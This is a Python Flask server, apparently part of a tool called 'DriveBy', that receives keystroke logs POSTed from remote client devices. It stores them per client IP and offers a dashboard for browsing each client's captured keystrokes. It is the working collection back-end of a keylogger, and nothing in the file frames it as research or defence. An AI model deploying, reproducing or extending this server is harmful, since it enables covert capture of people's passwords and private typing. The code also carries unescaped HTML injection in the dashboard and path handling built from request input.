#!/usr/bin/env python3
"""
DriveBy Data Collection Server
Handles incoming keystroke data from cluster devices
"""

import json
import os
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
import threading

class DataCollectionServer:
    def __init__(self, config_path="config.json"):
        self.load_config(config_path)
        self.app = Flask(__name__)
        self.setup_routes()
        self.active_clients = {}

    def load_config(self, config_path):
        """Load configuration from JSON file"""
        try:
            with open(config_path, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            print(f"Config file {config_path} not found, using defaults")
            self.config = {
                "server": {"data_port": 8081},
                "data": {"storage_path": "collected_data", "log_format": "json"}
            }

    def setup_routes(self):
        """Setup Flask routes for data collection"""

        @self.app.route('/collect', methods=['POST'])
        def collect_data():
            """Receive keystroke data from clients"""
            try:
                client_ip = request.remote_addr
                data = request.get_json()

                if not data:
                    return jsonify({'status': 'error', 'message': 'No data received'}), 400

                # Update client status
                self.active_clients[client_ip] = {
                    'last_seen': datetime.now().isoformat(),
                    'total_keystrokes': self.active_clients.get(client_ip, {}).get('total_keystrokes', 0) + len(data.get('keystrokes', []))
                }

                # Store the data
                self.store_keystroke_data(client_ip, data)

                return jsonify({
                    'status': 'success',
                    'message': 'Data received',
                    'timestamp': datetime.now().isoformat()
                })

            except Exception as e:
                print(f"Error collecting data: {e}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        @self.app.route('/status')
        def status():
            """Return data collection status"""
            return jsonify({
                'status': 'running',
                'active_clients': len(self.active_clients),
                'clients': self.active_clients,
                'storage_path': self.config['data']['storage_path']
            })

        @self.app.route('/dashboard')
        def dashboard():
            """Web dashboard for viewing collected data"""
            return render_template_string(self.get_dashboard_html())

        @self.app.route('/data/<client_ip>')
        def get_client_data(client_ip):
            """Get data for specific client"""
            try:
                client_dir = os.path.join(self.config['data']['storage_path'], client_ip)
                if not os.path.exists(client_dir):
                    return jsonify({'error': 'Client not found'}), 404

                files = []
                for filename in os.listdir(client_dir):
                    if filename.endswith('.json'):
                        filepath = os.path.join(client_dir, filename)
                        with open(filepath, 'r') as f:
                            data = json.load(f)
                            files.append({
                                'filename': filename,
                                'timestamp': data.get('timestamp'),
                                'keystroke_count': len(data.get('data', {}).get('keystrokes', []))
                            })

                return jsonify({
                    'client_ip': client_ip,
                    'files': sorted(files, key=lambda x: x['timestamp'], reverse=True)
                })

            except Exception as e:
                return jsonify({'error': str(e)}), 500

    def store_keystroke_data(self, client_ip, data):
        """Store keystroke data from client"""
        timestamp = datetime.now().isoformat()

        # Create client-specific directory
        client_dir = os.path.join(self.config['data']['storage_path'], client_ip)
        os.makedirs(client_dir, exist_ok=True)

        # Create filename with timestamp
        safe_timestamp = timestamp.replace(':', '-').replace('.', '-')
        filename = f"keystrokes_{safe_timestamp}.json"
        filepath = os.path.join(client_dir, filename)

        # Prepare data for storage
        storage_data = {
            'timestamp': timestamp,
            'client_ip': client_ip,
            'client_info': data.get('client_info', {}),
            'data': data
        }

        # Write to file
        with open(filepath, 'w') as f:
            json.dump(storage_data, f, indent=2)

        # Log the storage
        keystroke_count = len(data.get('keystrokes', []))
        print(f"Stored {keystroke_count} keystrokes from {client_ip}")

        # Also append to daily log
        self.append_to_daily_log(client_ip, keystroke_count, timestamp)

    def append_to_daily_log(self, client_ip, keystroke_count, timestamp):
        """Append entry to daily summary log"""
        today = datetime.now().strftime('%Y-%m-%d')
        daily_log_path = os.path.join(self.config['data']['storage_path'], f'daily_summary_{today}.log')

        log_entry = {
            'timestamp': timestamp,
            'client_ip': client_ip,
            'keystroke_count': keystroke_count
        }

        with open(daily_log_path, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

    def get_dashboard_html(self):
        """Generate dashboard HTML"""
        return '''
        <!DOCTYPE html>
        <html>
        <head>
        <title>DriveBy Data Dashboard</title>
        <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .client { border: 1px solid #ccc; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .stats { background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 3px; }
        .refresh-btn { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
        .refresh-btn:hover { background: #0056b3; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        </style>
        <script>
        function refreshData() {
            location.reload();
        }

        function loadClientData(clientIp) {
            fetch(`/data/${clientIp}`)
            .then(response => response.json())
            .then(data => {
                const container = document.getElementById(`client-${clientIp.replace(/\\./g, '-')}`);
                let html = '<h4>Recent Files:</h4><table><tr><th>File</th><th>Timestamp</th><th>Keystrokes</th></tr>';

                data.files.slice(0, 10).forEach(file => {
                    html += `<tr><td>${file.filename}</td><td>${file.timestamp}</td><td>${file.keystroke_count}</td></tr>`;
                });

                html += '</table>';
                container.innerHTML = html;
            })
            .catch(error => {
                console.error('Error loading client data:', error);
            });
        }

        // Auto-refresh every 30 seconds
        setInterval(refreshData, 30000);
        </script>
        </head>
        <body>
        <h1>DriveBy Data Collection Dashboard</h1>

        <div class="stats">
        <h3>System Status</h3>
        <p><strong>Status:</strong> <span id="status">Loading...</span></p>
        <p><strong>Active Clients:</strong> <span id="client-count">Loading...</span></p>
        <p><strong>Last Updated:</strong> <span id="last-updated">Loading...</span></p>
        <button class="refresh-btn" onclick="refreshData()">Refresh</button>
        </div>

        <div id="clients-container">
        <h3>Active Clients</h3>
        <div id="clients">Loading client data...</div>
        </div>

        <script>
        // Load initial data
        fetch('/status')
        .then(response => response.json())
        .then(data => {
            document.getElementById('status').textContent = data.status;
            document.getElementById('client-count').textContent = data.active_clients;
            document.getElementById('last-updated').textContent = new Date().toLocaleString();

            const clientsDiv = document.getElementById('clients');
            let html = '';

            Object.keys(data.clients).forEach(clientIp => {
                const client = data.clients[clientIp];
                const clientId = clientIp.replace(/\\./g, '-');

                html += `
                <div class="client">
                <h4>Client: ${clientIp}</h4>
                <p><strong>Last Seen:</strong> ${client.last_seen}</p>
                <p><strong>Total Keystrokes:</strong> ${client.total_keystrokes || 0}</p>
                <div id="client-${clientId}">
                <button onclick="loadClientData('${clientIp}')">Load Recent Data</button>
                </div>
                </div>
                `;
            });

            if (html === '') {
                html = '<p>No active clients</p>';
            }

            clientsDiv.innerHTML = html;
        })
        .catch(error => {
            console.error('Error loading status:', error);
            document.getElementById('clients').innerHTML = '<p>Error loading client data</p>';
        });
        </script>
        </body>
        </html>
        '''

    def cleanup_old_data(self):
        """Clean up old data files (optional background task)"""
        # This could be implemented to remove old files after a certain period
        pass

    def run(self):
        """Start the data collection server"""
        print("Starting DriveBy Data Collection Server...")

        # Create data directory
        os.makedirs(self.config['data']['storage_path'], exist_ok=True)

        port = self.config['server']['data_port']
        print(f"Data collection server starting on port {port}")
        print(f"Dashboard available at: http://localhost:{port}/dashboard")

        self.app.run(
            host='0.0.0.0',
            port=port,
            debug=False,
            threaded=True
        )

if __name__ == "__main__":
    try:
        server = DataCollectionServer()
        server.run()
    except KeyboardInterrupt:
        print("\nShutting down Data Collection Server...")
    except Exception as e:
        print(f"Error starting data server: {e}")
